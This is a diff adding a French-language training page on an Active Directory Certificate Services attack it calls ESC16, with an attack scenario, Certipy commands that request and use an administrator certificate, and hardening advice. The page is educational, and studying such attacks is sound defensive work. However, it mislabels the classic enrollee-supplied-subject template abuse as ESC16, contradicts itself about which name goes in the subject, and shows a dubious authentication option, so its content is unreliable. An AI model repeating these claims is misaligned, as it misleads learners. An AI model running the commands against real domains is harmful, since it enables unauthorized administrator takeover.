@@ -1,0 +1,56 @@
+---
+title: ESC16
+date: '2025-07-15'
+draft: false
+---
+
+# 🛡️ ESC16
+
+## Qu'est-ce que la vulnérabilité ESC16 ?
+
+**ESC16** est une vulnérabilité liée à l'Active Directory Certificate Services (AD CS) permettant à un attaquant d'obtenir des privilèges élevés en abusant de mauvaises configurations sur l'autorité de certification.
+
+## 🎯 Objectifs pédagogiques
+- Comprendre le fonctionnement d'AD CS et des certificats dans AD
+- Savoir comment l'attaque ESC16 est réalisée
+- Identifier les risques liés à la délégation de droits sur les templates de certificats
+
+## 📋 Exemples de vulnérabilités et exploitation
+
+### Vulnérabilités courantes
+- **Templates de certificats mal configurés** : Permettent à des utilisateurs non privilégiés de demander des certificats avec des droits élevés.
+- **Extensions dangereuses activées** : Possibilité de demander des certificats pour n'importe quel utilisateur (ESC1, ESC2, ESC8, ESC13, ESC16, etc.).
+
+### Scénario d'exploitation
+1. **Identification d'un template vulnérable** :
+   - L'attaquant repère un template de certificat qui permet l'inscription par des utilisateurs standards et l'option "ENROLLEE SUPPLIES SUBJECT".
+2. **Demande d'un certificat d'administrateur** :
+   - L'attaquant demande un certificat pour un compte administrateur en spécifiant son propre nom d'utilisateur dans le champ subject.
+3. **Utilisation du certificat pour s'authentifier** :
+   - L'attaquant utilise le certificat obtenu pour s'authentifier en tant qu'administrateur.
+
+### Commandes d'exploitation avec Certipy
+
+```bash
+# Enumérer les templates vulnérables
+certipy-ad find -u user -p 'Password123!' -dc-ip 10.10.10.2 -domain ad.local
+
+# Demander un certificat pour un compte admin
+certipy-ad req -u user -p 'Password123!' -ca ca.ad.local -template vuln_template -upn admin@ad.local -dc-ip 10.10.10.2
+
+# Utiliser le certificat pour s'authentifier
+certipy-ad auth -u admin@ad.local -p '' -key admin.pfx -dc-ip 10.10.10.2
+```
+
+## 🛡️ Bonnes pratiques
+- Restreindre les droits d'inscription sur les templates de certificats
+- Désactiver les extensions dangereuses sur les templates
+- Auditer régulièrement la configuration d'AD CS
+
+## 📚 Ressources utiles
+- [HackTricks - ESC16](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-cs-esc1-esc13#esc16)
+- [Certipy - ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
+- [Microsoft - AD CS](https://learn.microsoft.com/fr-fr/windows-server/identity/ad-cs/)
+
+---
+*Dernière mise à jour : 15 juillet 2025* 
